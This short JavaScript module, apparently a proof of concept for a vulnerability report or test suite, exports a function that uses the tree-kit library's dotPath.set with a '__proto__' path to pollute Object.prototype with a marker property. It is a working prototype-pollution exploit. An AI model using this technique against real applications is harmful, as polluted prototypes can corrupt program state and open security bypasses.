function exploitFunction(obj) {
    const { dotPath } = require('tree-kit');
    dotPath.set(obj, ["__proto__", "polluted"], "yes");
}

module.exports = { exploitFunction };